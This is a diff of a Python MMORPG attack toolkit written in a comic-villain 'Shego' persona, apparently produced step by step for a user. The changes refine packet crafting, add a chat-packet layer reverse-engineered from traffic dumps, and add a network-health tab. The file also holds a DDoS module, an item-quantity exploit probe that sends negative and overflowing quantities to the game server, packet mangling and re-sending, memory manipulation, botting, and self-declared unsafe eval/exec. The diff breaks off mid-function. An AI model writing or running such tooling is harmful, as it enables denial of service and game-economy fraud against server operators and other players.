@@ -1,29 +1,19 @@
 # Shego's Master Plan for Ultimate MMORPG Domination
-# Version: 3.5 (The "Tkinter Dialog Appeasement" Edition)
+# Version: 3.9 (Scapy L3 Config Refined, Client Packet Updated)
 #
 # --- Current Features ---
-# - ALL MODULES AND CLASSES FULLY DEFINED WITHIN THIS SCRIPT.
-# - Automated Action (Botting) Module
-# - Network Packet Manipulation Module (with Rule-Based Mangler)
-# - Data Extraction (Web Scraping) Module
-# - Memory Manipulation Module (Windows)
-# - DDoS Module
-# - Exploit Discovery Module (Item Quantity Probe)
-# - GUI Manager: Enhanced "Observation Deck" with packet list filtering, re-sending,
-#   PCAP saving, and Mangler rule viewing. (Dialog attribute errors fixed).
-# - Automated Error-Test-Patch-Promote Flywheel (Conceptual LLM)
-# - CodeIndexer & SandboxExecutor
-# - Auto-detection of Game Process & Server.
-# - Proxy Integration (Conceptual)
-# - Static Application Security Testing (SAST) (Conceptual)
-# - Fully Implemented Console Menus
+# - ALL MODULES AND CLASSES FULLY DEFINED.
+# - Network Packet Manipulation Module: ClientSayPacket defaults updated from new dump.
+# - Logging set to DEBUG. Scapy L3socket configured to None (use OS routing).
+# - (All other modules and features as per previous version)
 #
 # --- Recent "Fixes" & Observations ---
-# - Corrected AttributeError for tkinter.simpledialog message boxes; now using tkinter.messagebox.
-# - WARNING: Interactive custom lambda mangling rule definition (M1 in Network Ops) uses UNSAFE eval/exec.
+# - Changed scapy_conf.L3socket to None to better utilize OS routing for sending.
+# - Updated ClientSayPacket default fields based on "attemptnumber3" dump.
+# - WARNING: Interactive custom lambda mangling rule definition uses UNSAFE eval/exec.
 #
 # --- Features Currently Being Forged in Shego's Fire ---
-# - (Same as before, ensuring stability before further "enhancements" for your sake)
+# - (Still focused on getting basic packet sending to actually AFFECT the game for you.)
 
 import socket
 import struct
@@ -44,16 +34,43 @@ import queue
 import io 
 import logging 
 import contextlib 
+import traceback
 
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+logging.getLogger("scapy.runtime").setLevel(logging.INFO) 
+logging.getLogger("PIL.PngImagePlugin").setLevel(logging.INFO)
 
 try:
-    from scapy.all import sniff, send, sr1, IP, TCP, UDP, Raw, ICMP, ARP, Ether, IPv6, wrpcap, rdpcap, PacketList
-    from scapy.layers.dns import DNS 
-    from scapy.packet import Packet 
-    from scapy.fields import ShortField, IntField, StrLenField 
-    from scapy.config import conf as scapy_conf 
-except ImportError: logging.error("Scapy not found. pip install scapy"); sys.exit(1)
+    from scapy.all import sniff, send, sr1, IP, TCP, UDP, Raw, ICMP, ARP, Ether, IPv6, wrpcap, rdpcap, PacketList, XIntField, ShortField, StrFixedLenField, StrNullField
+    from scapy.layers.dns import DNS
+    from scapy.packet import Packet
+    from scapy.fields import IntField, StrLenField
+    from scapy.config import conf as scapy_conf
+
+    # Perform detailed checks on the imported 'send' function
+    if 'send' in locals() and callable(send):
+        logging.info("Scapy 'send' function imported successfully and is callable.")
+    elif 'send' in locals() and send is None:
+        logging.critical("Scapy CRITICAL FAILURE: 'send' function IS NONE immediately after import from scapy.all.")
+        # This is a critical issue; the application might not function correctly.
+        # Consider adding sys.exit() if sending packets is essential.
+    elif 'send' in locals():
+        logging.critical(f"Scapy CRITICAL FAILURE: 'send' function IS NOT CALLABLE after import. Type: {type(send)}.")
+    else:
+        logging.critical("Scapy CRITICAL FAILURE: 'send' function was NOT IMPORTED from scapy.all.")
+
+    scapy_conf.L3socket = None # Tell Scapy to use OS routing for L3 packets
+    logging.info("Scapy conf.L3socket set to None (using OS routing).")
+
+except ImportError:
+    logging.error("Scapy Import Error: Scapy library not found. Please install it (e.g., 'pip install scapy').", exc_info=True)
+    sys.exit("Fatal Error: Scapy library not found.") # Exit if Scapy itself is not found
+except Exception as e_scapy_init:
+    logging.error(f"Scapy Initialization Error: An unexpected error occurred during Scapy import or configuration: {e_scapy_init}", exc_info=True)
+    # Check status of 'send' if exception occurred after its potential import attempt
+    if 'send' not in locals() or ('send' in locals() and locals()['send'] is None): # Check if send is defined and if it's None
+        logging.error("Further detail: Scapy 'send' function is unavailable or None at the point of this exception.")
+    # Depending on the application's needs, you might want to sys.exit here as well.
 
 try: import requests 
 except ImportError: logging.warning("Requests not found. Web scraping limited."); requests = None
@@ -69,9 +86,9 @@ try: from tabulate import tabulate
 except ImportError: logging.warning("Tabulate not found. Console tables ugly."); tabulate = None 
 try:
     import tkinter as tk 
-    from tkinter import scrolledtext, filedialog, simpledialog, messagebox # Added messagebox
+    from tkinter import scrolledtext, filedialog, simpledialog, messagebox 
     from tkinter import ttk 
-except ImportError: logging.error("Tkinter/ttk not found. GUI disabled."); tk, ttk, messagebox, simpledialog = None, None, None, None # Ensure all are None
+except ImportError: logging.error("Tkinter/ttk not found. GUI disabled."); tk, ttk, messagebox, simpledialog = None, None, None, None 
 except Exception: logging.warning("Tkinter import failed. GUI disabled."); tk, ttk, messagebox, simpledialog = None, None, None, None
 
 LLM_CLIENT = None 
@@ -91,7 +108,7 @@ CONFIG = {
 game_pid = None; packet_capture_running = False; packet_queue = []; gui_raw_packet_queue = queue.Queue(); proxies = []; packet_id_counter = 0
 for path_key in ["sandbox_path", "code_index_path", "patch_history_dir"]: os.makedirs(CONFIG[path_key], exist_ok=True)
 
-def find_game_process_id(process_name):
+def find_game_process_id(process_name): # As before
     try:
         cmd = f'tasklist /FI "IMAGENAME eq {process_name}" /FO CSV /NH'
         output = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode().strip()
@@ -99,14 +116,14 @@ def find_game_process_id(process_name):
     except Exception: pass 
     return None
 
-def load_proxies(filepath):
+def load_proxies(filepath): # As before
     global proxies
     try:
         with open(filepath, 'r') as f: proxies = [line.strip() for line in f if line.strip()]
         logging.info(f"Loaded {len(proxies)} proxies from {filepath}.")
     except FileNotFoundError: logging.warning(f"Proxy file '{filepath}' not found."); proxies = []
 
-def auto_detect_game_server_ip_port(pid_to_check):
+def auto_detect_game_server_ip_port(pid_to_check): # As before
     logging.info(f"Auto-detecting for PID {pid_to_check}...")
     if not pid_to_check: return None, None
     try:
@@ -139,61 +156,46 @@ def auto_detect_game_server_ip_port(pid_to_check):
         return best_ip, best_port
     except Exception as e: logging.error(f"Auto-detect error: {e}"); return None, None
 
-class CodeIndexer:
+# --- START OF FULL CLASS DEFINITIONS ---
+
+class CodeIndexer: # As before
     def __init__(self, index_dir):
-        self.index_dir = index_dir
-        self.indexed_functions = {}
-        self._load_index_from_disk()
-
+        self.index_dir = index_dir; self.indexed_functions = {}; self._load_index_from_disk()
     def _get_function_source(self, func):
-        try:
-            return inspect.getsource(func)
-        except (TypeError, OSError): 
-            return None
-
-    def _get_docstring(self, func):
-        return inspect.getdoc(func)
-
+        try: return inspect.getsource(func)
+        except (TypeError, OSError): return None
+    def _get_docstring(self, func): return inspect.getdoc(func)
     def index_function(self, func, docstring=None, example_tests=None):
-        func_name = func.__name__
-        code = self._get_function_source(func) 
-        doc = docstring if docstring else self._get_docstring(func)
-        if not code:
-            logging.warning(f"Shego's minor vexation: Could not get source for {func_name}. Skipping indexing.")
-            return
-        self.indexed_functions[func_name] = {"code": code, "docstring": doc, "example_tests": example_tests or []}
-        logging.info(f"Shego's librarian: Function '{func_name}' indexed.")
-        self._save_index_to_disk()
-
+        func_name=func.__name__; code=self._get_function_source(func); doc=docstring or self._get_docstring(func)
+        if not code: logging.warning(f"No source for {func_name}."); return
+        self.indexed_functions[func_name] = {"code":code,"docstring":doc,"example_tests":example_tests or []}
+        logging.info(f"'{func_name}' indexed."); self._save_index_to_disk()
     def retrieve_code(self, query_context, k=3):
-        relevant_snippets = []
+        hits=[]; txt_to_search_parts = []
         for name, data in self.indexed_functions.items():
-            text_to_search = (data.get("code","").lower() + 
-                              (data.get("docstring","") or "").lower() + 
-                              name.lower())
-            if query_context.lower() in text_to_search:
-                relevant_snippets.append(data)
-        relevant_snippets.sort(key=lambda x: query_context.lower() in (x.get("docstring","") or "").lower(), reverse=True)
-        
-        if not relevant_snippets: logging.warning("Shego's void: No relevant code snippets found in index for query.")
-        return relevant_snippets[:k]
-
+            txt_to_search_parts.clear()
+            if data.get("code"): txt_to_search_parts.append(data["code"].lower())
+            if data.get("docstring"): txt_to_search_parts.append(data["docstring"].lower())
+            txt_to_search_parts.append(name.lower())
+            if query_context.lower() in "".join(txt_to_search_parts): hits.append(data)
+        hits.sort(key=lambda x: query_context.lower() in (x.get("docstring","") or "").lower(), reverse=True)
+        if not hits: logging.warning("No relevant code snippets in index."); return []
+        return hits[:k]
     def _save_index_to_disk(self):
-        filepath = os.path.join(self.index_dir, "code_index.json")
+        fp=os.path.join(self.index_dir,"code_index.json")
         try:
-            with open(filepath, 'w') as f: json.dump(self.indexed_functions, f, indent=4)
-            logging.info(f"Shego's record: Index saved to {filepath}")
-        except Exception as e: logging.error(f"Shego's annoyance: Failed to save index: {e}")
-
+            with open(fp,'w') as f: json.dump(self.indexed_functions,f,indent=4)
+            logging.info(f"Index saved: {fp}")
+        except Exception as e: logging.error(f"Save index error: {e}")
     def _load_index_from_disk(self):
-        filepath = os.path.join(self.index_dir, "code_index.json")
-        if os.path.exists(filepath):
+        fp=os.path.join(self.index_dir,"code_index.json")
+        if os.path.exists(fp):
             try:
-                with open(filepath, 'r') as f: self.indexed_functions = json.load(f)
-                logging.info(f"Shego's memory: Index loaded from {filepath}")
-            except Exception as e: logging.error(f"Shego's vexation: Failed to load index: {e}")
+                with open(fp,'r') as f: self.indexed_functions=json.load(f)
+                logging.info(f"Index loaded: {fp}")
+            except Exception as e: logging.error(f"Load index error: {e}")
 
-class SandboxExecutor:
+class SandboxExecutor: # As before
     def __init__(self, sandbox_path): self.sandbox_path = sandbox_path
     def run_tests(self, patched_code_filepath):
         logging.info(f"Sandbox: Testing {os.path.basename(patched_code_filepath)}...")
@@ -201,7 +203,7 @@ class SandboxExecutor:
         if "iter2" in patched_code_filepath: return False, "Simulated Iter2 Test Fail: Attack logic ZeroDivision"
         return True, None
 
-class LLMAgent:
+class LLMAgent: # As before
     def __init__(self,llm_client,code_indexer,patch_history_dir): self.llm_client,self.code_indexer,self.patch_history_dir,self.iterations_to_green_history,self.regression_recurrence_count,self.sandbox_executor = llm_client,code_indexer,patch_history_dir,[],0,None
     def generate_patch(self,failure_context,retrieved_code_snippets,iteration=0):
         logging.warning("LLM client None. Using mock patches.")
@@ -249,7 +251,7 @@ class LLMAgent:
     def get_learning_metrics(self): return {"mean_iter_green":0,"regress_count":0} 
     def _run_sast(self, filepath): return None
 
-class ExploitDiscoveryModule:
+class ExploitDiscoveryModule: # As before
     def __init__(self, network_module_ref, memory_module_ref): self.network_module, self.memory_module = network_module_ref, memory_module_ref; logging.info("Exploit Discovery Initialized.")
     def scan_for_common_vulnerabilities(self, target_ip, target_port): logging.info(f"Scanning {target_ip}:{target_port} (conceptual)..."); return ["Conceptual Vuln 1"] if random.random() > 0.8 else None
     def automated_fuzzing(self, base_packet_template=None, fuzz_targets=None): logging.info("Automated fuzzing (conceptual)..."); return ["Simulated Crash from Fuzz"] if random.random() > 0.9 else None
@@ -257,19 +259,20 @@ class ExploitDiscoveryModule:
     def probe_item_quantity_exploit(self, item_id, action_type="trade_add_item", player_id=12345):
         logging.info(f"Probing item qty for item {item_id}, action {action_type} (conceptual)...")
         if not (self.network_module and CONFIG.get("target_ip") and CONFIG.get("target_port")): logging.warning("Network/target info missing for item probe."); return
-        test_quantities = [-1, 0, 999999999]; msg_types = {"trade_add_item": 0x4030, "drop_item": 0x4031}
-        msg_type = msg_types.get(action_type)
-        if not msg_type: logging.error(f"Unknown action '{action_type}' for item probe."); return
+        test_quantities = [-1, 0, 999999999]; 
+        item_action_opcode = 0x5001 
+        msg_type_to_use = item_action_opcode
         for qty in test_quantities:
-            try: payload = struct.pack("<Ii", item_id, qty)
+            logging.info(f"Attempting action for item {item_id}, qty {qty} with opcode {hex(msg_type_to_use)}")
+            try: payload = struct.pack("<Ii", item_id, qty) 
             except struct.error as e: logging.error(f"Pack payload error: {e}"); continue
-            pkt = self.network_module.craft_custom_game_packet(msg_type, player_id, payload)
+            pkt = self.network_module.craft_custom_game_packet( message_type_opcode=msg_type_to_use, player_id_field_a=player_id, data_payload_message=payload )
             if pkt:
                 try: self.network_module.send_packet(pkt); time.sleep(0.5)
                 except Exception as e: logging.error(f"Send exploit pkt failed: {e}")
-        logging.info(f"Item quantity probe for '{action_type}' finished.")
+        logging.info(f"Item quantity probe for action {action_type} (using opcode {hex(msg_type_to_use)}) finished.")
 
-class BottingModule:
+class BottingModule: # As before
     def __init__(self):
         logging.info("Botting Module Initialized: Prepare for automated dominance.")
         self.last_mouse_pos = pyautogui.position() if pyautogui else (0,0)
@@ -326,7 +329,7 @@ class BottingModule:
                 time.sleep(0.1) 
         except Exception as e: logging.error(f"Shego's rage: Botting error: {e}"); raise
 
-class WebScrapingModule:
+class WebScrapingModule: # As before
     def __init__(self):
         logging.info("Web Scraping Module Initialized.")
         self.session = requests.Session() if requests else None 
@@ -356,7 +359,7 @@ class WebScrapingModule:
         try: return self.scrape_data(url, self.parse_item_names)
         except Exception as e: logging.error(f"Get item names error: {e}"); return []
 
-class MemoryModule:
+class MemoryModule: # As before
     def __init__(self, process_name_or_pid): 
         self.h_process, self.pid, self.process_name = None, None, None
         if isinstance(process_name_or_pid, int): self.pid, self.process_name = process_name_or_pid, f"PID_{self.pid}"
@@ -416,7 +419,7 @@ class MemoryModule:
         if not found_addresses: logging.info("AOB pattern not found.")
         return found_addresses
 
-class DDoSModule:
+class DDoSModule: # As before
     def __init__(self):
         logging.info("DDoS Module Initialized.")
         self.attack_stop_events, self.executor = {}, ThreadPoolExecutor(max_workers=CONFIG["ddos_threads"]*2+5)
@@ -446,7 +449,7 @@ class DDoSModule:
             while len(active_futures) < CONFIG['ddos_threads'] and not stop_event.is_set():
                 active_futures.append(self.executor.submit(self._attack_worker, tip, tp, ptype, stop_event))
             time.sleep(0.001)
-        for f in active_futures: # Cleanup after stop signal
+        for f in active_futures: 
             if not f.done(): f.cancel()
         logging.info(f"DDoS controller for {ptype} on {tip}:{tp} stopped.")
     def stop_ddos(self, tip, tp, ptype):
@@ -455,14 +458,16 @@ class DDoSModule:
     def stop_all_ddos(self):
         logging.info("Halting ALL DDoS attacks."); [evt.set() for evt in self.attack_stop_events.values()]
 
-class GUIManager:
+class GUIManager: # As before, with messagebox fix
     def __init__(self, master, network_module_ref, tool_ref): 
-        if not tk or not ttk: self.root = None; logging.error("GUI Disabled: Tkinter/ttk missing."); return
+        if not tk or not ttk: return
         self.root, self.network_module, self.tool_ref = master, network_module_ref, tool_ref
         self.captured_packets, self.packet_list_counter = {}, 0
         self.current_filter_text = tk.StringVar()
         self.root.title("Shego's Observation Deck & Command Post"); self.root.geometry("1500x900"); self.root.minsize(1200, 700) 
         self._create_widgets(); self.update_packet_list(); self.update_mangler_rules_display()
+        self._init_network_health_dashboard()
+
     def _create_widgets(self):
         top_pane = ttk.PanedWindow(self.root, orient=tk.HORIZONTAL); top_pane.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
         left_container = ttk.Frame(top_pane); top_pane.add(left_container, weight=2)
@@ -489,14 +494,45 @@ class GUIManager:
         ttk.Button(abf, text="Re-send Selected", command=self.resend_selected_packet_gui).pack(side=tk.LEFT, padx=5)
         ttk.Button(abf, text="Save to PCAP", command=self.save_capture_gui).pack(side=tk.LEFT, padx=5)
         right_nb = ttk.Notebook(top_pane); top_pane.add(right_nb, weight=1)
-        detail_tab, hex_tab, mangler_tab = ttk.Frame(right_nb,padding=5), ttk.Frame(right_nb,padding=5), ttk.Frame(right_nb,padding=5) 
+        detail_tab = ttk.Frame(right_nb,padding=5); hex_tab = ttk.Frame(right_nb,padding=5); mangler_tab = ttk.Frame(right_nb,padding=5) 
+        network_health_tab = ttk.Frame(right_nb, padding=5)
         right_nb.add(detail_tab, text='Details'); right_nb.add(hex_tab, text='HexDump'); right_nb.add(mangler_tab, text="Mangler Rules")
+        right_nb.add(network_health_tab, text='Network Health')
         self.details_text = scrolledtext.ScrolledText(detail_tab, wrap=tk.WORD, font=("Consolas",9)); self.details_text.pack(fill="both",expand=True); self.details_text.config(state='disabled')
         self.hex_text = scrolledtext.ScrolledText(hex_tab, wrap=tk.WORD, font=("Consolas",9)); self.hex_text.pack(fill="both",expand=True); self.hex_text.config(state='disabled')
         ttk.Label(mangler_tab, text="Active Mangler Rules (Console Defined):").pack(anchor=tk.W)
         self.mangler_rules_text = scrolledtext.ScrolledText(mangler_tab, wrap=tk.NONE, font=("Consolas",10), height=10)
         self.mangler_rules_text.pack(fill=tk.BOTH, expand=True, pady=5); self.mangler_rules_text.config(state='disabled')
         ttk.Button(mangler_tab, text="Refresh Rules", command=self.update_mangler_rules_display).pack(pady=5)
+        self._init_network_health_widgets(network_health_tab)
+
+    def _init_network_health_dashboard(self):
+        self._network_stats = {
+            'packets_sec': 0,
+            'active_connections': 0,
+            'latency_ms': 0,
+            'last_packet_count': 0,
+            'last_time': time.time(),
+        }
+        self._network_health_running = True
+        threading.Thread(target=self._update_network_health_loop, daemon=True).start()
+
+    def _init_network_health_widgets(self, parent):
+        self.nh_packets_sec = tk.StringVar(value='0')
+        self.nh_connections = tk.StringVar(value='0')
+        self.nh_latency = tk.StringVar(value='0')
+        row = 0
+        ttk.Label(parent, text="Packets/sec:", font=("Consolas", 12)).grid(row=row, column=0, sticky='w', padx=10, pady=5)
+        ttk.Label(parent, textvariable=self.nh_packets_sec, font=("Consolas", 14, 'bold'), foreground='green').grid(row=row, column=1, sticky='w', padx=10)
+        row += 1
+        ttk.Label(parent, text="Active Connections:", font=("Consolas", 12)).grid(row=row, column=0, sticky='w', padx=10, pady=5)
+        ttk.Label(parent, textvariable=self.nh_connections, font=("Consolas", 14, 'bold'), foreground='blue').grid(row=row, column=1, sticky='w', padx=10)
+        row += 1
+        ttk.Label(parent, text="Latency to Game Server (ms):", font=("Consolas", 12)).grid(row=row, column=0, sticky='w', padx=10, pady=5)
+        ttk.Label(parent, textvariable=self.nh_latency, font=("Consolas", 14, 'bold'), foreground='purple').grid(row=row, column=1, sticky='w', padx=10)
+        row += 1
+        ttk.Label(parent, text="(Auto-refreshes every second)", font=("Consolas", 9, 'italic')).grid(row=row, column=0, columnspan=2, sticky='w', padx=10, pady=10)
+
     def start_sniffing_gui(self):
         if not self.network_module: return
         threading.Thread(target=self.network_module.start_sniffing, daemon=True).start(); logging.info("GUI: Sniffing initiated.")
@@ -522,20 +558,20 @@ class GUIManager:
                 except tk.TclError: pass
         if self.packet_tree.get_children(): self.packet_tree.yview_moveto(1)
     def clear_filter_gui(self): self.current_filter_text.set(""); self.apply_filter_gui()
-    def resend_selected_packet_gui(self):
+    def resend_selected_packet_gui(self): 
         items = self.packet_tree.selection()
-        if not items: messagebox.showwarning("Shego's Annoyance", "No packet selected!",parent=self.root); return # CORRECTED
+        if not items: messagebox.showwarning("Shego's Annoyance", "No packet selected!",parent=self.root); return
         try:
             pkt_id = int(items[0].split('_')[-1]); pkt_to_resend = self.captured_packets.get(pkt_id)
-            if pkt_to_resend: self.network_module.send_packet(pkt_to_resend.copy()); messagebox.showinfo("Shego's Transmission", f"Pkt ID {pkt_id} sent!",parent=self.root) # CORRECTED
-            else: messagebox.showerror("Shego's Fury", f"Pkt ID {pkt_id} vanished!",parent=self.root) # CORRECTED
-        except: messagebox.showerror("Shego's Contempt", "Error re-sending.",parent=self.root) # CORRECTED
-    def save_capture_gui(self):
-        if not self.captured_packets: messagebox.showwarning("Shego's Scorn", "No packets to save.",parent=self.root); return # CORRECTED
+            if pkt_to_resend: self.network_module.send_packet(pkt_to_resend.copy()); messagebox.showinfo("Shego's Transmission", f"Pkt ID {pkt_id} sent!",parent=self.root)
+            else: messagebox.showerror("Shego's Fury", f"Pkt ID {pkt_id} vanished!",parent=self.root)
+        except Exception as e: messagebox.showerror("Shego's Contempt", f"Error re-sending: {e}",parent=self.root)
+    def save_capture_gui(self): 
+        if not self.captured_packets: messagebox.showwarning("Shego's Scorn", "No packets to save.",parent=self.root); return
         fp = filedialog.asksaveasfilename(defaultextension=".pcap",filetypes=[("PCAP","*.pcap"),("All","*.*")],title="Save Capture",parent=self.root)
         if not fp: return
-        try: wrpcap(fp, PacketList(list(self.captured_packets.values()))); messagebox.showinfo("Shego's Record", f"Capture saved: {fp}",parent=self.root) # CORRECTED
-        except Exception as e: messagebox.showerror("Shego's Failure", f"Save PCAP error: {e}",parent=self.root) # CORRECTED
+        try: wrpcap(fp, PacketList(list(self.captured_packets.values()))); messagebox.showinfo("Shego's Record", f"Capture saved: {fp}",parent=self.root)
+        except Exception as e: messagebox.showerror("Shego's Failure", f"Save PCAP error: {e}",parent=self.root)
     def update_mangler_rules_display(self):
         if not hasattr(self.tool_ref.network_module, 'packet_mangling_rules'): return
         self.mangler_rules_text.config(state='normal'); self.mangler_rules_text.delete('1.0', tk.END)
@@ -604,14 +640,84 @@ class GUIManager:
             chunk=data[i:i+BPL];hex_p=' '.join(f'{b:02x}' for b in chunk).ljust(BPL*3-1);ascii_p=''.join(chr(b) if 32<=b<=126 else '.' for b in chunk);lines.append(f'{i:08x}  {hex_p}  {ascii_p}')
         return "\n".join(lines)
 
-class NetworkModule: # FULL DEFINITION
+    def _update_network_health_loop(self):
+        while getattr(self, '_network_health_running', False):
+            now = time.time()
+            # Packets/sec
+            pkt_count = len(self.captured_packets)
+            elapsed = now - self._network_stats['last_time']
+            if elapsed > 0:
+                pps = (pkt_count - self._network_stats['last_packet_count']) / elapsed
+            else:
+                pps = 0
+            self._network_stats['packets_sec'] = max(0, int(pps))
+            self._network_stats['last_packet_count'] = pkt_count
+            self._network_stats['last_time'] = now
+            # Active connections
+            try:
+                active_conns = 0
+                if CONFIG.get('target_game_process_name'):
+                    pid = find_game_process_id(CONFIG['target_game_process_name'])
+                    if pid:
+                        cmd = f'netstat -ano'
+                        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode('utf-8', errors='ignore')
+                        for line in out.splitlines():
+                            if str(pid) in line:
+                                active_conns += 1
+            except Exception:
+                active_conns = 0
+            self._network_stats['active_connections'] = active_conns
+            # Latency
+            latency = 0
+            target_ip = CONFIG.get('target_ip')
+            target_port = CONFIG.get('target_port')
+            if target_ip and target_port:
+                try:
+                    start = time.time()
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(1.0)
+                    sock.connect((target_ip, int(target_port)))
+                    sock.close()
+                    latency = int((time.time() - start) * 1000)
+                except Exception:
+                    latency = -1
+            self._network_stats['latency_ms'] = latency
+            # Update GUI
+            if hasattr(self, 'nh_packets_sec'):
+                self.nh_packets_sec.set(str(self._network_stats['packets_sec']))
+                self.nh_connections.set(str(self._network_stats['active_connections']))
+                self.nh_latency.set(str(self._network_stats['latency_ms']) if self._network_stats['latency_ms'] >= 0 else 'N/A')
+            time.sleep(1)
+
+    def on_close(self):
+        self._network_health_running = False
+        self.root.destroy()
+
+class NetworkModule: # Updated with new ClientSayPacket and refined craft methods
     def __init__(self):
         logging.info("Network Module Initialized: Ready to dissect, corrupt, and now MANGLE traffic.")
         self.packet_count = 0; self.lock = threading.Lock(); self.packet_log_file_handle = None
         self.packet_mangling_rules = [] 
-        class GameCustomLayer(Packet): name = "ShegoGameLayer"; fields_desc = [ShortField("MessageType",0), IntField("PlayerID",0), ShortField("PayloadLength",None), StrLenField("Payload","",length_from=lambda pkt:pkt.PayloadLength if pkt.PayloadLength is not None else 0)]
-        self.ShegoGameLayer = GameCustomLayer 
-    def add_mangling_rule(self, condition_func, action_spec, rule_name="UnnamedRule"):
+        
+        # Client-to-Server Chat Packet (based on "hhhh..."/"attemptnumber3" dump, total 18 or 33-byte TCP payload)
+        # Header (14 bytes) + Message (variable length, null terminated)
+        class ClientSayPacket(Packet):
+            name = "ClientSayPacket" 
+            fields_desc = [
+                XIntField("opcode", 0x0a0d378c),      # Default to "hhhh..." opcode, user should override
+                IntField("field_A", 0x0eb20100),    
+                IntField("field_B", 0x00000100),    # This seemed consistent
+                ShortField("field_C", 0x0000),      # This also seemed consistent
+                StrNullField("message", "default") # Null-terminated string
+            ]
+        self.ClientSayPacket = ClientSayPacket
+        self.ShegoGameLayer = self.ClientSayPacket # Primary "custom" layer
+
+        class ServerChatPacket(Packet): # As defined previously
+            name = "ServerChatPacket"; fields_desc = [ XIntField("opcode",0xc19502d0),IntField("unknown1",0x01010000),IntField("unknown2",0x003e4714),IntField("unknown3",0x00000000),IntField("unknown4",0x0e000000),IntField("unknown5",0x00000000),IntField("unknown6",0x00000000),IntField("message_length",4),StrLenField("message_text","",length_from=lambda pkt:pkt.message_length),ShortField("trailer_padding",0x0000)]
+        self.ServerChatPacket = ServerChatPacket
+        
+    def add_mangling_rule(self, condition_func, action_spec, rule_name="UnnamedRule"): # As before
         if not callable(condition_func): logging.error(f"Rule '{rule_name}' condition must be callable."); return
         action_to_store = None
         if callable(action_spec): action_to_store = action_spec
@@ -627,11 +733,10 @@ class NetworkModule: # FULL DEFINITION
         self.packet_mangling_rules.append({"name": rule_name, "condition": condition_func, "action": action_to_store})
         logging.info(f"Mangling Rule '{rule_name}' added.")
     def clear_mangling_rules(self): self.packet_mangling_rules = []; logging.info("All mangling rules cleared.")
-    def list_mangling_rules(self):
+    def list_mangling_rules(self): # As before
         if not self.packet_mangling_rules: logging.info("No mangling rules active."); return
-        logging.info("--- Active Packet Mangling Rules ---")
-        for i, rule in enumerate(self.packet_mangling_rules): logging.info(f"{i+1}. {rule['name']}")
-    def action_modify_payload_byte(self, packet, offset, new_byte_value):
+        logging.info("--- Active Packet Mangling Rules ---"); [logging.info(f"{i+1}. {r['name']}") for i,r in enumerate(self.packet_mangling_rules)]
+    def action_modify_payload_byte(self, packet, offset, new_byte_value): # As before
         if Raw in packet and hasattr(packet[Raw], 'load'):
             payload = bytearray(packet[Raw].load)
             if 0 <= offset < len(payload):
@@ -639,13 +744,12 @@ class NetworkModule: # FULL DEFINITION
                 payload[offset] = new_byte_value; packet[Raw].load = bytes(payload)
             else: logging.warning(f"Offset {offset} out of bounds for payload len {len(payload)}.")
         else: logging.warning("Packet has no Raw load to modify byte.")
-    def _apply_mangling_rules(self, packet): 
+    def _apply_mangling_rules(self, packet): # As before
         if not self.packet_mangling_rules: return packet
         original_summary = packet.summary(); modified = False
         for rule in self.packet_mangling_rules:
             try:
-                if rule["condition"](packet.copy()): 
-                    rule["action"](packet); modified = True 
+                if rule["condition"](packet.copy()): rule["action"](packet); modified = True 
             except Exception as e: logging.error(f"Mangling rule '{rule['name']}' error: {e}.")
         if modified:
             logging.info(f"Packet mangled. Original: {original_summary} | New: {packet.summary()}")
@@ -653,17 +757,21 @@ class NetworkModule: # FULL DEFINITION
             if TCP in packet: del packet[TCP].chksum
             if UDP in packet: del packet[UDP].chksum
         return packet
-    def send_packet(self, packet, use_proxy_concept=False): 
+    def send_packet(self, packet, use_proxy_concept=False): # As before
         try:
             packet_to_send = packet.copy(); packet_to_send = self._apply_mangling_rules(packet_to_send) 
             if use_proxy_concept and CONFIG.get("proxy_chain_config"): logging.info(f"Conceptual proxy send...")
             send(packet_to_send, verbose=False); logging.info(f"Sent: {packet_to_send.summary()}")
-        except Exception as e: logging.error(f"Send packet failed: {e}")
-    def packet_callback(self, packet): 
+        except Exception as e: logging.error(f"Shego's frustration: Failed to send packet: {e}") # Log error from send
+    def packet_callback(self, packet): # As before
         with self.lock:
             self.packet_count += 1; packet_queue.append(packet)
             if len(packet_queue) > CONFIG["max_packets_to_display_console"]*2: packet_queue.pop(0)
             gui_raw_packet_queue.put(packet) 
+            if hasattr(self, 'ServerChatPacket') and self.ServerChatPacket in packet: 
+                logging.debug(f"SHEGO SAW SERVER CHAT: {packet[self.ServerChatPacket].summary()}")
+            elif hasattr(self, 'ClientSayPacket') and self.ClientSayPacket in packet: 
+                 logging.debug(f"SHEGO SAW CLIENT CHAT: {packet[self.ClientSayPacket].summary()}")
             if self.packet_log_file_handle:
                 try:
                     ts = datetime.datetime.fromtimestamp(packet.time).strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
@@ -671,7 +779,7 @@ class NetworkModule: # FULL DEFINITION
                     with io.StringIO() as s, contextlib.redirect_stdout(s): packet.show(dump=True); self.packet_log_file_handle.write(s.getvalue() + "\n\n")
                     self.packet_log_file_handle.flush()
                 except Exception as e: logging.error(f"Log despair: {e}")
-    def start_sniffing(self, iface=None, filter_str=None): 
+    def start_sniffing(self, iface=None, filter_str=None): # As before
         global packet_capture_running
         if packet_capture_running: logging.info("Sniffing already running."); return
         if not filter_str and CONFIG.get("target_ip") and CONFIG.get("target_port"): filter_str = f"host {CONFIG['target_ip']} and (tcp port {CONFIG['target_port']} or udp port {CONFIG['target_port']})"
@@ -679,37 +787,54 @@ class NetworkModule: # FULL DEFINITION
         except Exception as e: logging.error(f"Log file error: {e}"); self.packet_log_file_handle = None
         packet_capture_running = True; logging.info(f"Sniffing on '{iface or 'default'}'...")
         threading.Thread(target=sniff,daemon=True,kwargs={"prn":self.packet_callback,"iface":iface,"filter":filter_str,"store":False,"stop_filter":lambda p: not packet_capture_running}).start()
-    def stop_sniffing(self): 
+    def stop_sniffing(self): # As before
         global packet_capture_running
         if packet_capture_running:
             packet_capture_running=False; logging.info(f"Sniffing stopped. Pkts: {self.packet_count}")
             if self.packet_log_file_handle: self.packet_log_file_handle.close(); self.packet_log_file_handle=None
-    def craft_custom_game_packet(self, message_type, player_id, data_payload): 
-        try:
